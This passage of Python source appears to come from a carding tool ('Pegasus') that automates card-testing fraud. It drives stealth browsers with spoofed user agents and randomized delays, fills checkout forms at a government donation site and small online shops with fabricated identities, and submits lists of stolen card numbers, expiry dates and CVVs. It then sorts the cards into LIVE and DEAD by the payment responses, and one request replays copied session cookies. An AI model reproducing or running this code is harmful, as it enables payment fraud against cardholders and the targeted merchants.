                        "Cookie": "_gcl_au=1.1.627072010.1733990760; _tt_enable_cookie=1; _ttp=VUfL4Eq-rPTSOHj1xjZ02QbZBO9.tt.1; _fbp=fb.1.1733990760503.3577934411381748; _ga=GA1.1.853205576.1733990761; _hjSession_2640253=eyJpZCI6ImRkMTg4M2Y1LTU4NzAtNDliMi05NmI0LThlMDAyM2JhODdlMiIsImMiOjE3MzM5OTA3NjIxNzksInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; TPIDC=tl2kw-1kfxuvgm-sa8elxv4nugrcht321wb-y40is3akbd2mlru-3fan-i27l; _wpnlvusw=1; cwdcc=true; cus=false; PrestaShop-d60c552dd43cdc6368406ad315632a6c=4a90e42def23033e5ffde5045881827c0647f186db65826caf6e75965e6ab629%3AMKf5AcwKIWKdxGe4pxr8FmF9%2BudNj0dqj5NfIBUFqhnEk5WWpV%2BgJksFe5z8kBv44b%2BfB6JPdF9qlSys%2BrSYap4F%2FGVVXa8wmOG8vu%2Bq0dA%3D; _hjSessionUser_2640253=eyJpZCI6ImM4OGYyZDJjLWEzZTItNWQ0NS1iYzhjLTBhNzZiYTQ0MGQ0MCIsImNyZWF0ZWQiOjE3MzM5OTA3NjIxNzgsImV4aXN0aW5nIjp0cnVlfQ==; PrestaShop-0b7391ecc2c5ee9794592648fc88d3e3=25d16f236bf6ea5766da46de672c22adafceee39c1e1a255c1c245d615dfd304%3AMKf5AcwKIWKdxGe4pxr8FgE4YSb1PlU52vIa9LYTKcoO1JCnGNM1WIJJ604OMqI40cehxRhJ7rJ2TQw6n%2FmFZvy4gYqXx1%2BG%2F2UGs7wuZRzdYP7YR0ULm6B7tRr2FJ62IzMXM8rxJwkE74Cevy%2BoNEvyfRvipbnAVOI2qq64%2Fk1zBtFx1y5kTQBXyTAbv5yA%2FVRpfjfdukK1WlwMvEvUt90684SYYCjyvEm%2B9npuRuVgHLhKv1KC5vikZyTZ8TOkQlTLJQeNMk17lODgtHfPOfSuh1hEKZNPguCzJQCexZHYiMjeW7L4%2BQnmPKSkmWzGhvml3qiuzTqx5gmpjJyK6Jm1rp6toLKLUAcgd%2BUwGOH%2FP2UAO9YMf0xlERXdYchaBgwcuz1glZSCDN3QbEiIN1QYCoM%2F0xdaqHd3viAELZUkRN75LENMbzstT5d50%2F5N8CTixokuZBh7cvToH0ds8%2BXVAzWT0LM5OM3abaGyGqzn3CuD0vHgr%2BDRNWhGVMqbHdnTyZz%2FIPEJOzeyPeIFbg%3D%3D; cf_clearance=4nSmPMxZlgA5gyTKOhFbgWd1txOiJFK0tuTI8C9sUhg-1733992356-1.2.1.1-X0prygqw5CbxT3IrgrwvHjbZb5u4Xt6t6.3S_YaVfd1PjLcbK2DnfEfGbmuuDH5N9JrfZJkONTW2wKW16QOTZzALjm2L8DOFkqfzOFrdXQrzBJD8aWCwWw7XcvHNihG9DHXnBy01k0m2ol4dFFcyjZOg6K4mU7kfp2vaCCxJ.C.UvFAahzv0MHlltdkEZjnWS8I8eU47gbTsmEry5R2A4vDWbv_owxOtovOMpgO1GlHvVj9BPWLGkSzTUULKAVggkqgirYHCpJgmYSxKWTsrcCJzxwKekLyk7lrY_HnbuyUDMkeFJ93s_FIcvGDsGt7967eTO4g_c5RPkVY2LBbjzkYYE94mzkO4WSGiwq5nL3qriNYRVAomD2ku0wcrDcGDUz9XUp7KmEpzTG2kQ_BgiQ; wpnViewcount=39; cwdscc=true; _wpn_cotpc=1; sdtpc=1; _wpnbecc=39; _wpnpecc=39; _wpnmvecc=39; _wpnhecc=39; _ga_PQW347GRMR=GS1.1.1733990760.1.1.1733992454.52.1.1092969500"
                    }

                    data = {
                        "payment_id": "tarjeta",
                        "_sd_payu_nombre_titular": "Pegasus Club",
                        "_sd_payu_tipo_tarjeta": "MASTERCARD",
                        "_sd_payu_cuotas": "1",
                        "_sd_payu_tarjeta_guiones": formatlive,
                        "_sd_payu_tarjeta": self.ccs[self.cont],
                        "_sd_payu_mes": mes,
                        "_sd_payu_ano": ano,
                        "_sd_payu_ccv": "0000"
                    }

                    response = requests.post(url, headers=headers, data=data)

                    if response.ok:
                        print(response.text)
                    else:
                        print("Error:", response.status_code, response.text)

                    # FIN PETICION ORDEN

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def payitRecheck(self):

    self.text_changed.emit("Auth Charged | LEGACY ")

    headless2 = getHeadless(self)
    user_agent, device_metrics = openBrowser(2, headless2)

    if self.username == "Lau":
        headless2 = True

    with SB(test=False, incognito=True, uc=True, agent=user_agent, headless2=headless2) as sb:
    #with SB(test=False, incognito=True, headless2=headless2) as sb:

        sb.save_screenshot_after_test = False
        sb.save_page_source_after_test = False

        if "Macintosh" in user_agent:

            platform = "MacIntel"

        elif "Windows" in user_agent:

            platform = "Win32"

        else:

            platform = "Linux"

        sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

            "userAgent": user_agent,
            "platform": platform,

        })
        
        sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

            "mobile": True,
            "width": device_metrics["width"],
            "height": device_metrics["height"],
            "deviceScaleFactor": device_metrics["deviceScaleFactor"],
            "fitWindow": True

        })

        self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

        try:

            if self.tools.validate_creditos(self.username,self.password) == True:
                self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                return None

            email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
            phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
            address = str(random.randint(100, 999)) + ' wall street lake' + str(random.randint(100, 999)) + ' Rd'
            fullname = self.first1 + ' ' + self.last1
            dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            tipo_cambio = 4000  # Actualiza esto según el tipo de cambio actual
            valor_usd = random.randint(4000, 10000) / tipo_cambio

            links = [
                'https://pay.payitgov.com/ncdonations'
            ]

            link = random.choice(links)
            
            print('USER AGENT ACTUAL:', sb.get_user_agent())

            try:
                sb.open(link)

                sb.type("#first-name", self.first1)
                time.sleep(random.uniform(1, 2))
                sb.type("#last-name", self.last1)
                time.sleep(random.uniform(1, 2))
                sb.type("#email-address", email)
                time.sleep(random.uniform(1, 2))
                sb.type("#phone-number", phone_number)
                time.sleep(random.uniform(1, 2))
                sb.type("#street-address", address)
                time.sleep(random.uniform(1, 2))
                sb.type("#city", "Sunrise")
                time.sleep(random.uniform(1, 2))
                sb.select_option_by_value("#adminDivision1", "13")
                time.sleep(random.uniform(1, 2))
                sb.type("#postcode", "33351")
                time.sleep(random.uniform(1, 2))
                sb.type("#payment-amount", valor_usd)
                time.sleep(random.uniform(1, 2))
                try: # Pausa proteccion.
                    sb.wait_for_element("body > div > div > div > div > form > div > div:nth-child(12) > div > div:nth-child(1) > button", timeout=15)
                except Exception as e:
                    print("Error en boton de pago.")

                sb.click("body > div > div > div > div > form > div > div:nth-child(12) > div > div:nth-child(1) > button")
                time.sleep(random.uniform(1, 2))

                sb.wait_for_element("body > iframe")
                time.sleep(random.uniform(1, 3))
                sb.switch_to_frame("body > iframe")
                time.sleep(random.uniform(1, 3))
                sb.wait_for_element("body > iframe")
                time.sleep(random.uniform(1, 3))
                sb.switch_to_frame("body > iframe")
                time.sleep(random.uniform(1, 3))
                sb.click("//button[contains(text(), 'Continuar')]")
                time.sleep(random.uniform(1, 2))
                sb.switch_to_default_content()
                sb.wait_for_element("body > iframe")
                time.sleep(random.uniform(1, 3))
                sb.switch_to_frame("body > iframe")
                time.sleep(random.uniform(1, 2))
                sb.click("//button[contains(text(), 'Method')]")
                time.sleep(random.uniform(1, 2))

                

                sb.click("//button[contains(text(), 'Card')]")
                time.sleep(random.uniform(1, 2))
                sb.wait_for_element("//iframe[contains(@name, 'payitAddPaymentMethodIFrame')]")
                time.sleep(random.uniform(1, 3))
                sb.switch_to_frame("//iframe[contains(@name, 'payitAddPaymentMethodIFrame')]")
                    
                # Inicio testeo

                # Organizando data de CC
                ccs, mes, ano, ccn, typ = (
                str(self.ccs[self.cont]).strip(),
                str(self.mes[self.cont]).strip(),
                str(self.anio[self.cont]).strip(),
                str(self.cvv[self.cont]).strip(),
                self.tools.bintype(self.ccs[self.cont])
                )

                brand = self.ccs[self.cont][0:1]
                binCC = self.ccs[self.cont][0:6]

                self.text_changed.emit('🔍 Iniciando validación extra para asegurar resultados. ¡Tu seguridad es nuestra prioridad! 🛡️✨')

                livemsg = f"LIVE|PEGASUSCHK|LEGACYCHARGED|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                deadmsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                fecha = f"{mes}{ano[2:4]}"

                # Payment Form
                sb.press_keys("#street-address", address)
                time.sleep(random.uniform(1, 2))
                sb.press_keys("#city", "Sunrise")
                time.sleep(random.uniform(1, 2))
                sb.press_keys("#adminDivision1", "Florida")
                time.sleep(random.uniform(1, 2))
                sb.press_keys("#postcode", "33351")
                time.sleep(random.uniform(1, 2))
                sb.select_option_by_value("#country", "236")
                time.sleep(random.uniform(1, 2))
                sb.click("#id-17")
                time.sleep(random.uniform(1, 2))

                sb.press_keys("#cc-number", self.ccs[self.cont])
                #sb.type("#cc-number", self.ccs[self.cont])
                time.sleep(random.uniform(1, 6))
                sb.press_keys("#cc-exp-month", self.mes[self.cont])
                time.sleep(random.uniform(1, 2))
                sb.press_keys("#cc-exp-year", self.anio[self.cont])
                time.sleep(random.uniform(1, 2))
                sb.press_keys("#cc-csc", self.cvv[self.cont])
                time.sleep(random.uniform(1, 2))

                sb.switch_to_default_content()

                time.sleep(random.uniform(2, 4))
                sb.wait_for_element("body > iframe")
                sb.switch_to_frame("body > iframe")
                sb.click("//button[contains(text(), 'Pay')]")
                time.sleep(random.uniform(2, 3))

                sb.wait_for_element_clickable("//button[contains(text(), 'Change')]")
                

                # Analizando resultado 

                try:
                    #msgPay = sb.get_text("//div[@role='alert'][.//p[contains(text(), 'Issue with payment method')]]")
                    msgPay = sb.get_text("//div[@role='alert']")
                    print(msgPay)

                except Exception as e:

                    try:
                        url = sb.get_current_url()
                        print(url)
                        # element live //a[contains(text(), 'Make Another Payment')]
                        if "success" in url:
                            if self.tools.repetir(livemsg) == True:
                                msgPay = 'RELIVE'
                                deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                self.text_dead.emit(deadmsg)
                        
                            else:
                                self.text_live.emit(livemsg)
                    except Exception as e:
                        print("Error en:", e)
                        return False

                    try:
                        msgBan = sb.get_text("//div[contains(@class, 'src-components-InfoBox-__infoBox--')]")
                        if "reCaptcha" in msgBan:
                            return False
                    except Exception as e:
                        msgPay = ""
                        print("Error en:", e)
                        return False

                if "different payment" in msgPay:
                    self.text_live.emit(deadmsg)

                elif "risk threshold tripped" in msgPay:
                    self.text_dead.emit(deadmsg)

                else:
                    self.text_changed.emit('🛑 Para solucionar este inconveniente, por favor, contacta a un administrador. ¡Estamos aquí para ayudarte! 🌐✨')
                    print("LIVE", livemsg)
                    time.sleep(500)
                        
                sb.click("//button[contains(text(), 'Change')]")
                    
            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                self.printed.emit(error_message)

        except Exception as e:

            self.text_changed.emit('ELIMINANDO RASTREADORES!')  
            exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
            self.printed.emit(error_message)           
                
    self.text_changed.emit('TESTEO FINALIZADO')



def recheck(self):

    try:
        
        self.text_changed.emit('RECHECK CHARGED | PEGASUS EVOLUTION')
        self.cont = 0 
        createAccount = 2
        contadorBan = 0         

        while self.cont < self.total_lines:

            #with SB(uc=True, headless2=getHeadless(self)) as sb:
            headless2 = getHeadless(self)
            user_agent, device_metrics = openBrowser(2, headless2)

            with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

                sb.save_screenshot_after_test = False
                sb.save_page_source_after_test = False

                if "Macintosh" in user_agent:

                    platform = "MacIntel"

                elif "Windows" in user_agent:

                    platform = "Win32"

                else:

                    platform = "Linux"

                sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                    "userAgent": user_agent,
                    "platform": platform,

                })
                
                sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                    "mobile": True,
                    "width": device_metrics["width"],
                    "height": device_metrics["height"],
                    "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                    "fitWindow": True

                })

                self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

                try:

                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                        return None

                    email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                    passwd = 'C2*#'+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789*#') for _ in range(8))
                    phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                    address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'

                    links = [

                        'https://jwelchfarms.com/product/extra-virgin-olive-oil-100ml/',
                        'https://jwelchfarms.com/product/fig-balsamic-vinegar/',
                        'https://jwelchfarms.com/product/olive-wood-bottle-stopper/',
                        'https://jwelchfarms.com/product/jwelchfarms-duo-gift-set/',
                        'https://jwelchfarms.com/product/white-balsamic-vinegar/',
                        'https://jwelchfarms.com/product/olive-wood-cross/',
                    ]

                    link = random.choice(links)
                    
                    print('USER AGENT ACTUAL:', sb.get_user_agent())
                    sb.open(link)

                except Exception as e:
                
                    print('Error en configuracion de navegador.', e)
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message = (str(exc_type)+' '+str(exc_tb.tb_lineno))+' '+str(link)
                    self.printed.emit(error_message)

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                    break

            self.text_changed.emit('ELIMINANDO RASTREADORES!')
                    
        self.text_changed.emit('TESTEO FINALIZADO')

    except Exception as e:
        error_message = f"Error en Gates: {str(e)}"
        print(error_message)
        self.app.signal_error.emit(error_message)




#|--------------------------------Recheck-Gates------------------------------|

class VIPUserActions:
    '''Clase que se encarga de manejar los roles para usuarios VIP'''
    from selenium.webdriver.common.proxy import Proxy, ProxyType

    def __init__(self, sb):
        self.sb = sb

    def navegar(self):
        # URL del archivo en el repositorio de GitHub
        github_url = 'https://raw.githubusercontent.com/worldkrory/WizardDownload/dev/rsc/vip_index.html'

        # Ruta relativa al archivo HTML local en la carpeta 'config'
        config_folder = 'config'
        file_name = 'vip_index.html'
        file_path = os.path.join(config_folder, file_name)
        
        # Descargar el archivo de GitHub
        response = requests.get(github_url)
        if response.status_code == 200:
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(response.text)
            print(f"Archivo descargado y guardado en: {file_path}")
        else:
            print(f"Error al descargar el archivo: {response.status_code}")


        # Convertir la ruta relativa a una ruta absoluta
        absolute_file_path = os.path.abspath(file_path)

        # Abrir la página web
        #self.sb.get("https://snowxchecker.my.canva.site/info")
        # Abrir el archivo HTML localmente
        self.sb.get(f"file://{absolute_file_path}")

        # Encontrar el elemento por ID y hacer scroll hasta él
        #element = self.sb.find_element(By.ID, "kYQWVIStBgYKJIET")
        #self.sb.execute_script("arguments[0].scrollIntoView(true);", element)

        # Detectar si driverVIP sigue abierto
